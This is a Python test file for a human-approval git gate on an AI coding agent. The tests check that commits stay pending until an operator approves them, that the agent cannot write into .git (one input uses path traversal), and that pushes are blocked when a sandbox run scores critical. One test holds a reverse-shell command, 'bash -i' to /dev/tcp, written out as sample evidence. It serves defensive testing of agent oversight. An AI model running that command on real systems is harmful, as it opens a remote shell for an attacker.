"""M5 git gate: the agent only *requests* commits; the host commits (and
pushes) after operator approval via the API."""
import subprocess

import httpx
import pytest

from backend import gitgate
from backend.agent.tools import registry
from backend.auth import hash_password
from backend.config import settings
from backend.db import get_db, init_db
from backend.main import app
from backend.memory import ensure_memory_seeds


@pytest.fixture
async def client(tmp_env):
    await init_db()
    ensure_memory_seeds()
    db = await get_db()
    try:
        await db.execute(
            "INSERT INTO users (username, password_hash) VALUES (?, ?)",
            ("operator", hash_password("hunter2")),
        )
        await db.commit()
    finally:
        await db.close()
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as c:
        await c.post("/api/auth/login",
                     json={"username": "operator", "password": "hunter2"})
        await c.post("/api/projects", json={"name": "Demo", "summary": "demo"})
        await c.post("/api/projects/demo/load")
        yield c


def _pdir():
    return settings.projects_dir / "demo"


async def _latest_request_id(client) -> int:
    r = await client.get("/api/projects/demo/git/requests")
    return r.json()["requests"][0]["id"]


async def test_ensure_repo_and_status(client):
    await gitgate.ensure_repo("demo")
    assert (_pdir() / ".git").is_dir()
    gi = (_pdir() / ".gitignore").read_text()
    for line in (".staging/", ".workspace.json", ".context.json", "data/"):
        assert line in gi
    marker = _pdir() / ".git" / "jarvis-marker"
    marker.write_text("x")
    await gitgate.ensure_repo("demo")  # second call is a no-op, not a re-init
    assert marker.exists()
    (_pdir() / "code" / "x.py").write_text("print(1)\n")
    status = await gitgate.status_text("demo")
    assert "no commits yet" in status and "code/x.py" in status


async def test_commit_request_is_pending_and_commits_nothing(client):
    (_pdir() / "code" / "x.py").write_text("print(1)\n")
    out = await registry.dispatch("git_commit_request", {"message": "Add x"})
    assert "pending" in out and "#" in out and "approve" in out.lower()
    r = await client.get("/api/projects/demo/git/requests")
    reqs = r.json()["requests"]
    assert len(reqs) == 1
    assert reqs[0]["status"] == "pending" and reqs[0]["commit_sha"] is None
    rc, _, _ = await gitgate.run_git("demo", "rev-parse", "--verify", "-q", "HEAD")
    assert rc != 0  # no commit happened


async def test_approve_commits_and_skips_runtime_files(client):
    (_pdir() / "code" / "x.py").write_text("print(1)\n")
    (_pdir() / ".workspace.json").write_text("{}")
    await registry.dispatch("write_file", {"path": "code/pending.py", "content": "y"})
    await registry.dispatch("git_commit_request", {"message": "Add x"})
    rid = await _latest_request_id(client)
    r = await client.post(f"/api/projects/demo/git/requests/{rid}/approve")
    assert r.status_code == 200
    body = r.json()
    assert body["status"] == "approved" and body["commit_sha"] and body["decided_at"]
    rc, sha, _ = await gitgate.run_git("demo", "rev-parse", "HEAD")
    assert rc == 0 and sha.strip() == body["commit_sha"]
    _, files, _ = await gitgate.run_git("demo", "ls-files")
    tracked = files.split()
    assert "code/x.py" in tracked and "project.md" in tracked
    assert not any(t.startswith(".staging") for t in tracked)
    assert ".workspace.json" not in tracked
    _, porcelain, _ = await gitgate.run_git("demo", "status", "--porcelain")
    assert porcelain.strip() == ""  # tree clean; runtime files ignored
    diff = await gitgate.diff_text("demo")
    assert diff == "no changes"


async def test_reject_leaves_tree_untouched(client):
    (_pdir() / "a.txt").write_text("a")
    await registry.dispatch("git_commit_request", {"message": "Add a"})
    rid = await _latest_request_id(client)
    r = await client.post(f"/api/projects/demo/git/requests/{rid}/reject")
    assert r.status_code == 200 and r.json()["status"] == "rejected"
    assert (_pdir() / "a.txt").read_text() == "a"
    rc, _, _ = await gitgate.run_git("demo", "rev-parse", "--verify", "-q", "HEAD")
    assert rc != 0
    # a decided request can't be approved
    r = await client.post(f"/api/projects/demo/git/requests/{rid}/approve")
    assert r.status_code == 409
    r = await client.post("/api/projects/demo/git/requests/999/approve")
    assert r.status_code == 404


async def test_agent_cannot_write_into_git_dir(client):
    await gitgate.ensure_repo("demo")
    out = await registry.dispatch("write_file",
                                  {"path": ".git/config", "content": "x"})
    assert "error" in out.lower()
    out = await registry.dispatch("write_file",
                                  {"path": "code/../.git/config", "content": "x"})
    assert "error" in out.lower()
    r = await client.put("/api/projects/demo/file",
                         json={"path": ".git/hooks/pre-commit", "content": "x"})
    assert r.status_code == 400


async def test_empty_message_and_clean_tree_refused(client):
    await gitgate.ensure_repo("demo")
    out = await registry.dispatch("git_commit_request", {"message": "   "})
    assert "error" in out and "empty" in out
    row = await gitgate.create_request("demo", "Initial")
    await gitgate.approve_request(row["id"])
    out = await registry.dispatch("git_commit_request", {"message": "Nothing"})
    assert "error" in out and "clean" in out


async def test_commit_only_selected_paths(client):
    (_pdir() / "a.txt").write_text("a")
    (_pdir() / "b.txt").write_text("b")
    await registry.dispatch("git_commit_request",
                            {"message": "Add a", "paths": ["a.txt"]})
    rid = await _latest_request_id(client)
    r = await client.post(f"/api/projects/demo/git/requests/{rid}/approve")
    assert r.status_code == 200
    _, files, _ = await gitgate.run_git("demo", "ls-files")
    tracked = files.split()
    assert tracked == ["a.txt"]
    _, porcelain, _ = await gitgate.run_git("demo", "status", "--porcelain")
    assert "?? b.txt" in porcelain  # untouched, still uncommitted


async def test_push_blocked_on_critical_sandbox_run(client, tmp_env, monkeypatch):
    import json as _json

    monkeypatch.setattr(settings, "vm_dir", tmp_env / "vm")
    cap = tmp_env / "vm" / "captures"
    cap.mkdir(parents=True)
    db = await get_db()
    try:
        async with db.execute("SELECT id FROM projects WHERE slug='demo'") as c:
            pid = (await c.fetchone())["id"]
        cur = await db.execute(
            "INSERT INTO runs (project_id, status) VALUES (?, 'done')", (pid,))
        run_id = cur.lastrowid
        await db.commit()
    finally:
        await db.close()
    # evidence that the deterministic classifier scores critical (reverse shell)
    ev = {"execs": ["bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"], "flows": [],
          "blocked": [], "dns": [], "sensitive": [], "staged": []}
    (cap / f"gate-{run_id}-evidence.json").write_text(_json.dumps(ev))
    v = await gitgate.latest_run_verdict("demo")
    assert v and v["verdict"] == "crit"

    (_pdir() / "a.txt").write_text("a")
    row = await gitgate.create_request("demo", "Add a")
    # unforced approval is blocked (403), and nothing is committed
    r = await client.post(f"/api/projects/demo/git/requests/{row['id']}/approve")
    assert r.status_code == 403 and "CRITICAL" in r.json()["detail"]
    rc, _, _ = await gitgate.run_git("demo", "rev-parse", "--verify", "-q", "HEAD")
    assert rc != 0
    # force overrides the gate and commits
    r = await client.post(
        f"/api/projects/demo/git/requests/{row['id']}/approve?force=true")
    assert r.status_code == 200 and r.json()["status"] == "approved"


async def test_approve_pushes_when_remote_set(client, tmp_env):
    bare = tmp_env / "remote.git"
    subprocess.run(["git", "init", "-q", "--bare", str(bare)], check=True)
    db = await get_db()
    try:
        await db.execute("UPDATE projects SET github_remote = ? WHERE slug = 'demo'",
                         (str(bare),))
        await db.commit()
    finally:
        await db.close()
    (_pdir() / "a.txt").write_text("a")
    row = await gitgate.create_request("demo", "Add a")
    res = await gitgate.approve_request(row["id"])
    assert res["status"] == "approved" and res["error"] is None
    remote_sha = subprocess.run(
        ["git", "-C", str(bare), "rev-parse", "--branches"],
        capture_output=True, text=True, check=True).stdout.strip()
    assert remote_sha == res["commit_sha"]
